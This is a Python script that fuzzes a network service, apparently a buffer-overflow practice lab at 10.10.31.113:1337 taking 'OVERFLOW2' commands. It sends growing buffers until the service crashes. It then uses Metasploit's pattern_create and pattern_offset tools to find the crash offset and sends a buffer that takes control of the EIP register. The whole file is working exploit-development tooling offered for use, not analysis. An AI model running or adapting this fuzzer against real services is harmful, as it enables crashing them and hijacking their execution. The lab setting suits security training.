import socket
from time import sleep
import sys
from subprocess import Popen, PIPE

ip = "10.10.31.113"
port = 1337
timeout = 5

prefix = b"OVERFLOW2 "

inc_by = 100
i = 0
cyclic_pattern = b''
cyclic_offset_value = ''
cyclic_offset = 0

verbose = False

print("[*] Connect to ip: {}, port: {}".format(ip,port))
print("[*] Fuzzing - start at: {}, increase by: {}".format(i, inc_by))

while True:
   if (len(cyclic_pattern) > 0):
      buffer = cyclic_pattern
      cyclic_pattern = b''
      print("[+] Sending cyclic pattern of {} bytes".format(len(buffer)))
   elif (cyclic_offset > 0):
      buffer = b"A" * cyclic_offset + b"B" * 4 + b"C" * 100
      cyclic_offset = 0
      print("[+] Sending control of EIP with {} bytes".format(len(buffer)))
   else:
      buffer = (b"A" * (i - 10)) + b"B" * 10
      print("[+] Sending {} bytes".format(len(buffer)))

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.settimeout(timeout)
   try:
      connect = s.connect((ip, port))
      # grap initial banner before input
      resp = s.recv(1024)
      if (verbose == True):
         print("[*] banner: {}".format(resp))
      s.send(prefix + buffer + b"\r\n")
      resp = s.recv(1024)
      if (verbose == True):
         print("[!] response: {}".format(resp))
      s.close()
      sleep(.01)

   except:
      s.close()
      print("[!] Crash after '{}' bytes".format(len(buffer)))

      while True:
         print("[*] commands: inc #, pattern #, offset <pattern>")
         input_txt = input("Restart server and hit enter (exit/q(uit)/inc #): ").lower()
         if (input_txt.startswith("inc ")):
            num = input_txt[input_txt.index(" ")+1::]
            if (num.isnumeric()):
               inc_by = int(num)
            print("[*] Fuzzing - at: {}, increase by: {}".format(i, inc_by))
            break
         elif (input_txt.startswith("pattern ")):
            num = input_txt[input_txt.index(" ")+1::]
            if (num.isnumeric()):
               process = Popen(["msf-pattern_create", "-l", num], stdout=PIPE)
               (output, err) = process.communicate()
               exit_code = process.wait()
               cyclic_pattern = output.strip()
               break
            else:
               print("[!] Unknown pattern number '{}'".format(num))
               continue
         elif (input_txt.startswith("offset ")):
            cyclic_offset_value = input_txt[input_txt.index(" ")+1::]
            process = Popen(["msf-pattern_offset", "-q", cyclic_offset_value], stdout=PIPE)
            (output, err) = process.communicate()
            exit_code = process.wait()
            cyclic_offset = str(output.strip())
            cyclic_offset = int(cyclic_offset[cyclic_offset.rindex(" ")+1:-1])
            break

         if (len(input_txt) == 0 or input_txt == "c"):
            break
         elif (input_txt == "exit" or input_txt == "quit" or input_txt == "q"):
            print("[*] Exiting fuzzer!")
            sys.exit()
         else:
            print("[!] Unknown command '{}'".format(input_txt))
            continue

   i += inc_by
